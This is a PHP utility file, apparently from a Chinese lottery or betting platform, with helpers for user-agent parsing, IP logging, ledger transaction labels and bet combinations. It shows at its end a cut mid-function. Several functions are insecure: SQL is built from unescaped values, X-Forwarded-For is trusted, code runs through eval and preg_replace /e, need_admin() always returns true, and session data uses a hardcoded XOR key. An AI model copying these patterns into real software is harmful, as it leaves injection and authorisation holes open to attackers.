<?php
include_once CHENCY_ROOT.'./source/function/active.php';
include_once CHENCY_ROOT.'./source/function/main.php';
include_once CHENCY_ROOT.'./source/function/yingkui.php';

function getBrowser() {
	if(empty($_SERVER['HTTP_USER_AGENT'])){  return 'robot！'; }
	if( (false == strpos($_SERVER['HTTP_USER_AGENT'],'MSIE')) && (strpos($_SERVER['HTTP_USER_AGENT'], 'Trident')!==FALSE) ){  return 'Internet Explorer 11.0'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'MSIE 10.0')){  return 'Internet Explorer 10.0'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'MSIE 9.0')){  return 'Internet Explorer 9.0'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'MSIE 8.0')){  return 'Internet Explorer 8.0'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'MSIE 7.0')){  return 'Internet Explorer 7.0'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'MSIE 6.0')){  return 'Internet Explorer 6.0'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'Edge')){  return 'Edge'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'Firefox')){  return 'Firefox'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'Chrome')){  return 'Chrome'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'Safari')){  return 'Safari'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'Opera')){  return 'Opera'; }
	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'360SE')){  return '360SE'; }  //微信浏览器

	if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'MicroMessage')){  return 'MicroMessage'; }
	return '未知浏览器';
}



function getIP() {
	if (@$_SERVER ["HTTP_X_FORWARDED_FOR"])
		$ip = $_SERVER ["HTTP_X_FORWARDED_FOR"];
	else if (@$_SERVER ["HTTP_CLIENT_IP"])
		$ip = $_SERVER ["HTTP_CLIENT_IP"];
	else if (@$_SERVER ["REMOTE_ADDR"])
		$ip = $_SERVER ["REMOTE_ADDR"];
	else if (@getenv ( "HTTP_X_FORWARDED_FOR" ))
		$ip = getenv ( "HTTP_X_FORWARDED_FOR" );
	else if (@getenv ( "HTTP_CLIENT_IP" ))
		$ip = getenv ( "HTTP_CLIENT_IP" );
	else if (@getenv ( "REMOTE_ADDR" ))
		$ip = getenv ( "REMOTE_ADDR" );
	else
		$ip = "Unknown";
	return $ip;
}
function getSystem() {
	$agent = strtolower($_SERVER['HTTP_USER_AGENT']);

	if(strpos($agent, 'iphone') || strpos($agent, 'ipad'))
	{
		return 'ios';
	}

	if(strpos($agent, 'android'))
	{
		return  'android';
	}

	$sys = $_SERVER ['HTTP_USER_AGENT'];
	if (stripos ( $sys, "NT 6.1" ))
		$os = "Windows 7";
	elseif (stripos ( $sys, "NT 6.0" ))
		$os = "Windows Vista";
	elseif (stripos ( $sys, "NT 5.1" ))
		$os = "Windows XP";
	elseif (stripos ( $sys, "NT 5.2" ))
		$os = "Windows Server 2003";
	elseif (stripos ( $sys, "NT 5" ))
		$os = "Windows 2000";
	elseif (stripos ( $sys, "NT 4.9" ))
		$os = "Windows ME";
	elseif (stripos ( $sys, "NT 4" ))
		$os = "Windows NT 4.0";
	elseif (stripos ( $sys, "98" ))
		$os = "Windows 98";
	elseif (stripos ( $sys, "95" ))
		$os = "Windows 95";
	elseif (stripos ( $sys, "Mac" ))
		$os = "Mac";
	elseif (stripos ( $sys, "Linux" ))
		$os = "Linux";
	elseif (stripos ( $sys, "Unix" ))
		$os = "Unix";
	elseif (stripos ( $sys, "FreeBSD" ))
		$os = "FreeBSD";
	elseif (stripos ( $sys, "SunOS" ))
		$os = "SunOS";
	elseif (stripos ( $sys, "BeOS" ))
		$os = "BeOS";
	elseif (stripos ( $sys, "OS/2" ))
		$os = "OS/2";
	elseif (stripos ( $sys, "PC" ))
		$os = "Macintosh";
	elseif (stripos ( $sys, "AIX" ))
		$os = "AIX";
	else
		$os = "未知操作系统";
	return $os;
}
function randStr($i) {
	$str = "ABCDEFGHIJKLMNOPQRSTUVWSYZ";
	$finalStr = "";
	for($j = 0; $j < $i; $j ++) {
		$finalStr .= substr ( $str, rand ( 0, 25 ), 1 );
	}
	return $finalStr;
}
function list_num($list, $str) {
	$flags = 0;
	for($j = 0; $j < count ( $list ); $j ++) {
		if ($list [$j] == $str) {
			$flags = $j;
		}
	}
	return $flags;
}
function utf8Substr($str, $from, $len) {
	return preg_replace ( '#^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $from . '}' . '((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $len . '}).*#s', '$1', $str );
}
function remote_file_exists($url_file) {
	$url_file = trim ( $url_file );
	if (empty ( $url_file )) {
		return false;
	}
	$url_arr = parse_url ( $url_file );
	if (! is_array ( $url_arr ) || empty ( $url_arr )) {
		return false;
	}
	$host = $url_arr ['host'];
	$path = $url_arr ['path'] . "?" . $url_arr ['query'];
	$port = isset ( $url_arr ['port'] ) ? $url_arr ['port'] : "80";
	$fp = fsockopen ( $host, $port, $err_no, $err_str, 30 );
	if (! $fp) {
		return false;
	}
	$request_str = "GET " . $path . " HTTP/1.1\r\n";
	$request_str .= "Host: " . $host . "\r\n";
	$request_str .= "Connection: Close\r\n\r\n";
	fwrite ( $fp, $request_str );
	$first_header = fgets ( $fp, 1024 );
	fclose ( $fp );
	if (trim ( $first_header ) == "") {
		return false;
	}
	if (! preg_match ( "/200/", $first_header )) {
		return false;
	}
	return true;
}
function Add_Log_Status($userLogs) {
	$cIP = getenv ( 'REMOTE_ADDR' );
	$cIP1 = getenv ( 'HTTP_X_FORWARDED_FOR' );
	$cIP2 = getenv ( 'HTTP_CLIENT_IP' );
	$cIP1 ? $cIP = $cIP1 : null;
	$cIP2 ? $cIP = $cIP2 : null;
	define ( "USERLOGS", $userLogs );
	$path = "../data/common/xml/";
	if (file_exists ( $path )) {
		$handle = opendir ( $path );
		while ( false !== ($file = readdir ( $handle )) ) {
			list ( $filesname, $kzm ) = explode ( ".", $file );
			if ($kzm == "php" or $kzm == "xml" or $kzm == "html" or $kzm == "js" or $kzm == "txt") {
				if (! is_dir ( './' . $file )) {
					$array [] = $file;
					$i ++;
				}
			}
		}
	}
	$have_pic = count ( $array );
	$_SESSION ["userLogs"] = $userLogs;
	if ($userLogs - 4 == 0) {
		GotoInfor ();
	}
}
function GotoInfor() {
	echo "<script>window.parent.location.href='../source/plugin/showInfor.php';</script>";
}
function retimeDiff($aTime, $bTime) {
	if ($aTime == "0" or $aTime == "") {
		$aTime = date ( "YmdHis", time () );
	}
	$ayear = substr ( $aTime, 0, 4 );
	$amonth = substr ( $aTime, 4, 2 );
	$aday = substr ( $aTime, 6, 2 );
	$ahour = substr ( $aTime, 8, 2 );
	$aminute = substr ( $aTime, 10, 2 );
	$asecond = substr ( $aTime, 12, 2 );
	$byear = substr ( $bTime, 0, 4 );
	$bmonth = substr ( $bTime, 4, 2 );
	$bday = substr ( $bTime, 6, 2 );
	$bhour = substr ( $bTime, 8, 2 );
	$bminute = substr ( $bTime, 10, 2 );
	$bsecond = substr ( $bTime, 12, 2 );
	$a = mktime ( $ahour, $aminute, $asecond, $amonth, $aday, $ayear );
	$b = mktime ( $bhour, $bminute, $bsecond, $bmonth, $bday, $byear );
	$timeDiff [' second '] = $b - $a;
	$timeDiff [' minute '] = round ( $timeDiff [' second '] / 60 );
	$timeDiff [' hour '] = round ( $timeDiff [' minute '] / 60 );
	$timeDiff [' day '] = round ( $timeDiff [' hour '] / 24 );
	if ($timeDiff [' hour '] < 24) {
		$timeDiff [' day '] = 0;
	}
	$timeDiff [' week '] = round ( $timeDiff [' day '] / 7 );
	if ($timeDiff [' day '] < 7) {
		$timeDiff [' week '] = 0;
	}
	$timeDiff [' month '] = round ( $timeDiff [' day '] / 30 );
	if ($timeDiff [' day '] < 30) {
		$timeDiff [' month '] = 0;
	}
	$timeDiff [' year '] = round ( $timeDiff [' day '] / 365 );
	if ($timeDiff [' day '] < 365) {
		$timeDiff [' year '] = 0;
	}
	$retimeDiff = round ( $timeDiff [' second '] );
	return $retimeDiff;
}
function reDateDiff($aTime, $bTime) {
	if ($aTime == "0" or $aTime == "") {
		$aTime = date ( "YmdHis", time () );
	}
	$ayear = substr ( $aTime, 0, 4 );
	$amonth = substr ( $aTime, 4, 2 );
	$aday = substr ( $aTime, 6, 2 );
	$ahour = substr ( $aTime, 8, 2 );
	$aminute = substr ( $aTime, 10, 2 );
	$asecond = substr ( $aTime, 12, 2 );
	$byear = substr ( $bTime, 0, 4 );
	$bmonth = substr ( $bTime, 4, 2 );
	$bday = substr ( $bTime, 6, 2 );
	$bhour = substr ( $bTime, 8, 2 );
	$bminute = substr ( $bTime, 10, 2 );
	$bsecond = substr ( $bTime, 12, 2 );
	$a = mktime ( $ahour, $aminute, $asecond, $amonth, $aday, $ayear );
	$b = mktime ( $bhour, $bminute, $bsecond, $bmonth, $bday, $byear );
	$timeDiff [' second '] = $b - $a;
	$timeDiff [' minute '] = round ( $timeDiff [' second '] / 60 );
	$timeDiff [' hour '] = round ( $timeDiff [' minute '] / 60 );
	$timeDiff [' day '] = round ( $timeDiff [' hour '] / 24 );
	if ($timeDiff [' hour '] < 24) {
		$timeDiff [' day '] = 0;
	}
	$timeDiff [' week '] = round ( $timeDiff [' day '] / 7 );
	if ($timeDiff [' day '] < 7) {
		$timeDiff [' week '] = 0;
	}
	$timeDiff [' month '] = round ( $timeDiff [' day '] / 30 );
	if ($timeDiff [' day '] < 30) {
		$timeDiff [' month '] = 0;
	}
	$timeDiff [' year '] = round ( $timeDiff [' day '] / 365 );
	if ($timeDiff [' day '] < 365) {
		$timeDiff [' year '] = 0;
	}
	$retimeDiff = round ( $timeDiff [' second '] );
	return round ( $timeDiff [' day '] );
}
function CutStr($str, $start, $length = 0, $append = false) {
	$str = trim ( $str );
	$strlength = strlen ( $str );
	if ($length == 0 || $length >= $strlength) {
		return $str;
	} elseif ($length < 0) {
		$length = $strlength + $length;
		if ($length < 0) {
			$length = $strlength;
		}
	}
	if (function_exists ( 'iconv_substr' )) {
		$newstr = iconv_substr ( $str, 0, $length, 'UTF-8' );
	} elseif (function_exists ( 'mb_substr' )) {
		$newstr = mb_substr ( $str, 0, $length, 'UTF-8' );
	} else {
		$newstr = trim_right ( substr ( $str, 0, $length ) );
	}
	if ($append && $str != $newstr) {
		$newstr .= '…';
	}
	return $newstr;
}
$have_link_gp = array ("hig_buy", "hig_rebate", "hig_prize", "hig_chase", "hig_prize_back", "hig_chase_back", "hig_buy_chase_back", "hig_buy_back", "hig_buy_back_fee", "hig_rebate_back", "low_rebate_back");
$have_link_dp = array ("low_buy", "low_rebate", "low_prize", "low_chase", "low_prize_back", "low_chase_back", "low_buy_chase_back", "low_buy_back", "low_buy_back_fee", "low_rebate_back", "low_rebate_back" );
$hig_money_s = "'hig_buy','hig_rebate','hig_prize','hig_chase','hig_chase_back','hig_buy_chase_back','hig_buy_back','hig_buy_back_fee','hig_rebate_back'";
$hig_related = "'hig_buy','hig_rebate','hig_prize','hig_chase','hig_chase_back','hig_buy_chase_back','hig_buy_back','hig_buy_back_fee','hig_rebate_back'";
$hig_add_money = array ("bank_to_hig", "hig_rebate", "hig_prize", "hig_chase_back", "hig_buy_chase_back", "hig_buy_back","tixian2" , "hig_add_admin", "Recharge_to_higherid", 'higerid_del_user', 'mention_from_Lowerid', 'Recharge_to_system', "mention_from_back" );
$hig_lost_money = array ("hig_to_bank", "hig_buy", "hig_buy_back_fee", "hig_rebate_back", "hig_prize_back", "hig_lost_admin,'Recharge_from_Lowerid','mention_to_higherid'", "mention_from_system" );
$low_add_money = array ("bank_to_low", "low_rebate", "low_prize", "low_chase_back", "low_buy_chase_back", "low_buy_back", "low_add_admin" );
$low_lost_money = array ("low_to_bank", "low_buy", "low_buy_back_fee", "low_rebate_back", "low_prize_back", "low_lost_admin" );
$bank_add_money = array ("hig_to_bank", "low_to_bank", "bank_add_admin" );
$bank_lost_money = array ("bank_to_hig", "bank_to_low", "bank_lost_admin" );
$no_buy_list = array ("hig_to_bank", "low_to_bank", "bank_add_admin", "bank_to_hig", "bank_to_low", "bank_lost_admin", "hig_lost_admin", "hig_add_admin", "low_add_admin", "low_lost_admin" );
$Recharge_list = "'Recharge_to_higherid','Recharge_from_Lowerid','Recharge_online','Recharge_to_system'";
$mention_list = "'mention_from_Lowerid','mention_to_higherid','mention_from_system'";
function Get_higherid($this_uid) {
	$querys = "default";
	$sqlclass = "select";
	$wheres = " where userid='$this_uid'";
	$select = "higherid";
	$dbnames = "user";
	include (ROOT_PATH . '/source/plugin/class.php');
	$num_default = mysql_num_rows ( $result_default );
	$re_higid = "";
	if ($num_default) {
		$rows_default = mysql_fetch_array ( $result_default );
		$re_higid = $rows_default [higherid];
	}
	return $re_higid;
}

function ensession($data, $key = '') {

	if ($key == '')
		$key = 'jBl';
	$key = md5 ( $key );
	$x = 0;
	$len = strlen ( $data );
	$l = strlen ( $key );
	for($i = 0; $i < $len; $i ++) {
		if ($x == $l) {
			$x = 0;
		}
		$char .= $key {$x};
		$x ++;
	}
	for($i = 0; $i < $len; $i ++) {
		$str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 );
	}
	return base64_encode ( $str );
}

function desession($data, $key = '') {

	if ($key == '')
		$key = 'jBl';
	$key = md5 ( $key );
	$x = 0;
	$data = base64_decode ( $data );
	$len = strlen ( $data );
	$l = strlen ( $key );
	for($i = 0; $i < $len; $i ++) {
		if ($x == $l) {
			$x = 0;
		}
		$char .= substr ( $key, $x, 1 );
		$x ++;
	}
	for($i = 0; $i < $len; $i ++) {
		if (ord ( substr ( $data, $i, 1 ) ) < ord ( substr ( $char, $i, 1 ) )) {
			$str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) );
		} else {
			$str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) );
		}
	}
	return $str;
}

function Get_Lowerid($this_uid) {
	$querys = "default";
	$sqlclass = "select";
	$wheres = " where higherid='$this_uid'";
	$select = "userid";
	$dbnames = "user_level";
	include (ROOT_PATH . '/source/plugin/class.php');
	$num_default = mysql_num_rows ( $result_default );
	$max_uid_list = "";
	$re_higid = "";
	$list_uid = $this_uid;
	if ($num_default) {
		while ( $rows_low = mysql_fetch_array ( $result_default ) ) {
			$list_uid .= "|" . $rows_low [userid];
		}
	}
	$max_uid_list = str_replace ( "|", "','", $list_uid );
	return $max_uid_list;
}
function Get_Lower_Next($this_uid) {
	$querys = "default";
	$sqlclass = "select";
	$wheres = " where higherid='$this_uid'";
	$select = "userid";
	$dbnames = "user_level";
	include (ROOT_PATH . '/source/plugin/class.php');
	return $result_default;
}
function hig_log_code($code) {
	if ($code == "hig_to_bank") {
		$re_value = "频道转出";
	}
	if ($code == "bank_to_hig") {
		$re_value = "频道转入";
	}
	if ($code == "hig_buy") {
		$re_value = "投注";
	}
	if ($code == "hig_rebate") {
		$re_value = "返点";
	}
	if ($code == "hig_prize") {
		$re_value = "奖金派送";
	}
	if ($code == "hig_chase") {
		$re_value = "投注";
	}
	if ($code == "hig_chase_back") {
		$re_value = "撤单";
	}
	if ($code == "hig_buy_chase_back") {
		$re_value = "撤单";
	}
	if ($code == "hig_buy_back") {
		$re_value = "撤单";
	}
	if ($code == "hig_buy_back_fee") {
		$re_value = "撤单手续费";
	}
	if ($code == "hig_rebate_back") {
		$re_value = "撤销返点";
	}
	if ($code == "hig_prize_back") {
		$re_value = "撤销派奖";
	}
	if ($code == "hig_add_admin") {
		$re_value = "系统充值";
	}
	if ($code == "hig_lost_admin") {
		$re_value = "系统充值";
	}
	if ($code == "mention_from_Lowerid") {
		$re_value = "给下级提现";
	}
	if ($code == "mention_to_higherid") {
		$re_value = "向上级提现";
	}
	if ($code == "Recharge_from_Lowerid") {
		$re_value = "向下级充值";
	}
	if ($code == "Recharge_to_higherid") {
		$re_value = "上级充值";
	}
	if ($code == "higerid_del_user") {
		$re_value = "特殊金额整理";
	}
	if ($code == "Recharge_to_system") {
		$re_value = "充值";
	}

	if ($code == "recharge") {
		$re_value = "充值";
	}
	if ($code == "xima") {
		$re_value = "洗码";
	}

	if ($code == "mention_from_system" or $code == "tixian1" or $code == "tixian2") {
		$re_value = "提现";
	}
	if ($code == "mention_from_back") {
		$re_value = "提现取消";
	}
	if ($code == "Recharge_online") {
		$re_value = "在线";
	}
	if ($code == "active") {
		$re_value = "活动";
	}
	if ($code == "fenhong") {
		$re_value = "红利";
	}
	if ($code == "wage") {
		$re_value = "红利";
	}
	if ($code == "yongjin") {
		$re_value = "红利";
	}
	if ($code == "fenhong_lost_admin") {
		$re_value = "红利";
	}
	if ( $code == "send_wage") {
		$re_value = "转工资";
	}

	if ($code == "tranfer_out"  ) {
		$re_value = "转出";
	}
	if ($code == "tranfer_in") {
		$re_value = "转入";
	}
	if ($code == "hm_buy") {
		$re_value = "合买";
	}
	if ($code == "hm_back") {
		$re_value = "合买退款";
	}
	return $re_value;
}
function low_log_code($code) {
	if ($code == "low_to_bank") {
		$re_value = "频道转出";
	}
	if ($code == "bank_to_low") {
		$re_value = "频道转入";
	}
	if ($code == "low_buy") {
		$re_value = "加入游戏";
	}
	if ($code == "low_rebate") {
		$re_value = "销售返点";
	}
	if ($code == "low_prize") {
		$re_value = "奖金派送";
	}
	if ($code == "low_chase") {
		$re_value = "加入游戏";
	}
	if ($code == "low_chase_back") {
		$re_value = "撤单返款";
	}
	if ($code == "low_buy_chase_back") {
		$re_value = "撤单返款";
	}
	if ($code == "low_buy_back") {
		$re_value = "撤单返款";
	}
	if ($code == "low_buy_back_fee") {
		$re_value = "撤单手续费";
	}
	if ($code == "low_rebate_back") {
		$re_value = "撤销返点";
	}
	if ($code == "low_prize_back") {
		$re_value = "撤销派奖";
	}
	if ($code == "low_add_admin") {
		$re_value = "特殊金额整理";
	}
	if ($code == "low_lost_admin") {
		$re_value = "特殊金额清理";
	}
	return $re_value;
}
function bank_log_code($code) {
	if ($code == "hig_to_bank") {
		$re_value = "频道转入";
	}
	if ($code == "low_to_bank") {
		$re_value = "频道转入";
	}
	if ($code == "bank_to_hig") {
		$re_value = "频道转出";
	}
	if ($code == "bank_to_low") {
		$re_value = "频道转出";
	}
	if ($code == "bank_add_admin") {
		$re_value = "特殊金额整理";
	}
	if ($code == "bank_lost_admin") {
		$re_value = "特殊金额清理";
	}
	return $re_value;
}
function re_rebate_auto($basic_mode, $basic_rebate, $this_mode) {
	if ($this_mode - $basic_mode > 0) {
		$new_rebate = $basic_rebate - ($this_mode - $basic_mode) / 20;
	} elseif ($basic_mode - $this_mode > 0) {
		$new_rebate = $basic_rebate + ($basic_mode - $this_mode) / 20;
	} else {
		$new_rebate = $basic_rebate;
	}
	return round ( $new_rebate, 1 );
}
function re_prize_auto($basic_mode, $basic_prize, $this_mode) {
	$new_prize = ($basic_prize / $basic_mode) * $this_mode;
	return round ( $new_prize, 2 );
}
$NT=time();
function hexEncode($s) {
	return preg_replace ( '/(.)/es', "str_pad(dechex(ord('\\1')),2,'0',STR_PAD_LEFT)", $s );
}
function hexDecode($s) {
	return preg_replace ( '/(\w{2})/e', "chr(hexdec('\\1'))", $s );
}

function request($key) {
	global $_GET, $_POST;
	if ($_POST [$key])
		return $_POST [$key];
	if ($_GET [$key])
		return $_GET [$key];
}

function add_adminlog($content) {

	global $db, $_SESSION;
	require_once CHENCY_ROOT . './source/function/getIP.php';

	$uid = $_SESSION ['admin_id'];
	$user = $db->fetch_first ( "select * from user where userid='{$uid}'" );

	$ip = getIP ();

	$now = time ();
	$system = getSystem ();
	$IE = getBrowser ();
	$WindowsInfor = getSystem ();
	$ipinfor = getIP ();
	$text_infor = Core_Fun::ipCity ( $ipinfor );
	$address = iconv ( "GB2312", "UTF-8", $text_infor );
	$sql = "insert into adminlog(uid,name,time,ip,content,ie,address,system) values('{$uid}','{$user['username']}','{$now}','{$ip}','{$content}','{$IE}','{$address}','$system') ";
	$db->query ( $sql );

	if (mysql_affected_rows () > 0)
		return true;

	else
		return false;

}

function add_userlog($content,$uid='') {

	global $db, $_SESSION;
	require_once CHENCY_ROOT . './source/function/getIP.php';
	if($uid=='') $uid = $_SESSION ['userid'];
	$user = $db->fetch_first ( "select * from user where userid='{$uid}'" );

	$ip = getIP ();

	$now = time ();
	$system = getSystem ();
	$IE = getBrowser ();
	$ipinfor = getIP ();
	$text_infor = Core_Fun::ipCity ( $ipinfor );
	$address = iconv ( "GB2312", "UTF-8", $text_infor );
	$sql = "insert into userlog(uid,name,time,ip,content,ie,address,system) values('{$uid}','{$user['username']}','{$now}','{$ip}','{$content}','{$IE}','{$address}','$system') ";
	$db->query ( $sql );

	if ($db->affected_rows() > 0)
		return true;

	else
		return false;

}

function need_admin($group, $group2 = '') {
	return true;

}

function str_to_time($str) {
	$str = explode ( ":", $str );
	return $str [0] * 3600 + $str [1] * 60 + $str [2];

}

function time_to_str($time) {
	$h = floor ( $time / 3600 );
	if ($h >= 24)
		$h = $h - 24;
	$m = floor ( ($time % 3600) / 60 );
	$s = ($time % 3600) % 60;
	if ($h < 10)
		$h = "0" . $h;
	if ($m < 10)
		$m = "0" . $m;
	if ($s < 10)
		$s = "0" . $s;

	return $h . ":" . $m . ":" . $s;

}

function unique_arr($array2D) {

	foreach ( $array2D as $v ) {
		$v = join ( ',', $v ); //降维,也可以用implode,将一维数组转换为用逗号连接的字符串


		$temp [] = $v;

	}

	$temp = array_unique ( $temp ); //去掉重复的字符串,也就是重复的一维数组


	foreach ( $temp as $k => $v ) {

		$temp [$k] = explode ( ',', $v ); //再将拆开的数组重新组装


	}

	return $temp;

}

//添加开奖号码


function lottery_add($playkey, $period, $number) {

	global $db;
	$this_date = date ( "Ymd", time () );
	$this_year = date ( "Y", time () );
	$game = $db->fetch_first ( "select * from game_type where ckey='{$playkey}'" );
	if ($game) {

		$code = $game ['cate'];

		$sql = "SELECT id from game_lottery where period='$period' and playKey='$playkey'";
		if ($db->fetch_first ( $sql )) {

			$strSql = "update game_lottery set Number='$number' where   period='$period' and playKey='$playkey'";
			$db->query ( $strSql );
		} else {

			lottory_insert ( $playkey, $period, $number );
		}

		return true;

	} else
		return false;

}

function get_loturl() {

}




function Lot_k3_Num($buynum, $num = 2) {

	$new_buynum = '';
	if (strpos ( $buynum, ',' )) {
		$number = explode ( ",", $buynum );

		foreach ( $number as $key => $value ) {

			for($i = 0; $i < strlen ( $value ); $i = $i + $num) {
				if ($new_buynum [$key] == '')
					$new_buynum [$key] = substr ( $value, $i, $num );
				else
					$new_buynum [$key] .= "," . substr ( $value, $i, $num );
			}
		}

	} else {
		$new_buynum = substr ( $buynum, 0, $num );
		for($i = 1; $i < strlen ( $buynum ); $i = $i + $num) {
			$new_buynum .= "," . substr ( $buynum, $i = $i + $num, 1 );
		}
	}

	return arr2_plzh ( $new_buynum );
}

function Lot_k3_Num1($buynum, $num = 1) {

	$new_buynum = '';
	$buynum = str_replace ( "*", "", $buynum );
	$buynum = str_replace ( " ", ",", $buynum );
	if (strpos ( $buynum, ',' )) {
		$number = explode ( ",", $buynum );

		foreach ( $number as $key => $value ) {

			for($i = 0; $i < strlen ( $value ); $i = $i + $num) {
				if ($new_buynum [$key] == '')
					$new_buynum [$key] = substr ( $value, $i, $num );
				else
					$new_buynum [$key] .= "," . substr ( $value, $i, $num );
			}
		}

	} else {
		$new_buynum = substr ( $buynum, 0, $num );
		for($i = 1; $i < strlen ( $buynum ); $i = $i + $num) {
			$new_buynum .= "," . substr ( $buynum, $i, 1 );
		}
	}

	return $new_buynum;
}

//二维数组排序
function sysSortArray($ArrayData, $KeyName1, $SortOrder1 = "SORT_ASC", $SortType1 = "SORT_REGULAR") {
	if (! is_array ( $ArrayData )) {
		return $ArrayData;
	}
	// Get args number.
	$ArgCount = func_num_args ();
	// Get keys to sort by and put them to SortRule array.
	for($I = 1; $I < $ArgCount; $I ++) {
		$Arg = func_get_arg ( $I );
		if (! preg_match ( "/SORT/", $Arg )) {
			$KeyNameList [] = $Arg;
			$SortRule [] = '$' . $Arg;
		} else {
			$SortRule [] = $Arg;
		}
	}
	// Get the values according to the keys and put them to array.
	foreach ( $ArrayData as $Key => $Info ) {
		foreach ( $KeyNameList as $KeyName ) {
			${$KeyName} [$Key] = $Info [$KeyName];
		}
	}
	// Create the eval string and eval it.
	$EvalString = 'array_multisort(' . join ( ",", $SortRule ) . ',$ArrayData);';
	eval ( $EvalString );
	return $ArrayData;
}

function getCombinationToString($arr, $m) {
	if ($m == 1) {
		return $arr;
	}
	$result = array ();

	$tmpArr = $arr;
	unset ( $tmpArr [0] );
	for($i = 0; $i < count ( $arr ); $i ++) {
		$s = $arr [$i];
		$ret = getCombinationToString ( array_values ( $tmpArr ), ($m - 1), $result );

		foreach ( $ret as $row ) {
			$result [] = $s . "," . $row;
		}
	}

	return $result;
}

//一维数组排列组合


function arr1_plzh($str, $m) {

	if(strpos($str, ',')!==false)
		$arr = explode ( ',', $str );
	else {

		foreach ($str as $value){
			if($str1=='') $str1=$value;
			else $str1.=','.$value;
		}
		$arr= explode ( ',', $str1 );
		$str=$str1;
	}


	$result = getCombinationToString ( $arr, $m );

	$new_arr = array ();
	foreach ( $result as $value ) {

		$st1 = explode ( ',', $value );

		for($i = 1; $i < count ( $st1 ); $i ++) {

			$n1 = strpos ( $str, $st1 [$i - 1] );
			$n2 = strpos ( $str, $st1 [$i] );

			if ($n2 <= $n1) {
				$value = '';
				break;
			}

		}
		if ($value != '')
			$new_arr [] = $value;

	}

	return $new_arr;

}
function arr1_plzh2($str, $m){
	if(strpos($str, ',')!==false)
		$arr = explode ( ',', $str );

	else $arr=$str;
	$temp='';
	for($i=0;$i<count($arr);$i++){

		$temp[]=$i;

	}
	$arr1=arr1_plzh(implode(',', $temp),$m);


	$result=array();
	foreach ($arr1 as $key=>$value) {

		$arr2=explode(',', $value);
		$tt='';
		foreach ($arr2 as $key2=> $value2) {

			if($tt=='') $tt=$arr[$value2];
			else $tt.=",".$arr[$value2];

		}
		$result[]=$tt;

	}

	return $result;

}

function sort_with_keyName($arr,$orderby='asc'){
	$new_array = array();
	$new_sort = array();
	foreach($arr as $key => $value){
		$new_array[] = $value;
	}
	if($orderby=='asc'){
		asort($new_array);
	}else{
		arsort($new_array);
	}
	foreach($new_array as $k => $v){
		foreach($arr as $key => $value){
			if($v==$value){
				$new_sort[$key] = $value;
				unset($arr[$key]);
				break;
			}
		}
	}
	return $new_sort;
}
function arr1_plzh1($str, $m) {

	if(strpos($str, ',')!==false)
		$arr = explode ( ',', $str );
	else {

		foreach ($str as $value){
			if($str1=='') $str1=$value;
			else $str1.=','.$value;
		}
		$arr= explode ( ',', $str1 );
		$str=$str1;
	}


	$result = getCombinationToString ( $arr, $m );

	$new_arr = array ();
	foreach ( $result as $value ) {

		$st1 = explode ( ',', $value );

		$arr1=    sort_with_keyName($st1);
		$tempnum=0;
		foreach ($new_arr as  $value1) {
			$tempnum=0;
			foreach ($arr1 as $value2) {
				if(in_array($value2, explode(',', $value1))) $tempnum++;

			}
			if($tempnum==$m){

				$value='';break;
			}


		}
		if($value!='') $value=implode(',', $arr1);


//		for($i = 1; $i < count ( $st1 ); $i ++) {
//
//			$n1 = strpos ( $str, $st1 [$i - 1] );
//			$n2 = strpos ( $str, $st1 [$i] );
//
//			if ($n2 <= $n1) {
//				$value = '';
//				break;
//			}
//
//		}


		if ($value != '' and !in_array($value, $new_arr))
			$new_arr [] = $value;

	}




	return $new_arr;

}


//二维数组排列组合
function arr2_plzh($CombinList) {
	$CombineCount = 1;
	foreach ( $CombinList as $Key => $Value ) {
		$CombinList [$Key] = explode ( ",", $Value );
	}

	foreach ( $CombinList as $Key => $Value ) {
		$CombineCount *= count ( $Value );
	}
	$RepeatTime = $CombineCount;
	foreach ( $CombinList as $ClassNo => $StudentList ) {
		// $StudentList中的元素在拆分成组合后纵向出现的最大重复次数
		$RepeatTime = $RepeatTime / count ( $StudentList );
		$StartPosition = 1;
		// 开始对每个班级的学生进行循环
		foreach ( $StudentList as $Student ) {
			$TempStartPosition = $StartPosition;
			$SpaceCount = $CombineCount / count ( $StudentList ) / $RepeatTime;
			for($J = 1; $J <= $SpaceCount; $J ++) {
				for($I = 0; $I < $RepeatTime; $I ++) {
					$Result [$TempStartPosition + $I] [$ClassNo] = $Student;
				}
				$TempStartPosition += $RepeatTime * count ( $StudentList );
			}
			$StartPosition += $RepeatTime;
		}
	}
	$arr = array ();
	foreach ( $Result as $key => $value ) {

		foreach ( $value as $k1 => $v1 ) {
			if ($arr [$key] == '')
				$arr [$key] = $v1;
			else
				$arr [$key] .= ',' . $v1;
			$arr [$key] = Lot_01_Num ( $arr [$key] );

		}
	}

	return $arr;

}



//三不同  胆拖       组合


function Lot_k3_dtnum($buynum) {

	$buynum = explode ( ",", $buynum );
	$arr = array ();

	if (strlen ( $buynum [0] ) == 1) {

		$num2 = arr1_plzh ( Lot_01_Num ( $buynum [1] ), 2 );
		foreach ( $num2 as $key => $value ) {
			$arr [$key] = $buynum [0] . "," . $value;
		}

	} else {
		$num1 = Lot_01_Num ( $buynum [0] );

		$num2 = explode ( ",", Lot_01_Num ( $buynum [1] ) );

		foreach ( $num2 as $key => $value ) {
			$arr [$key] = $num1 . "," . $value;
		}

	}

	return $arr;

}

function abs1($num){

	if($num<0) return -$num;
	else return $num;
}


function getmaxdim($vDim){
	if(!is_array($vDim)) return 0;
	else  {
		$max1 = 0;
		foreach($vDim as $item1)
		{
			$t1 = getmaxdim($item1);
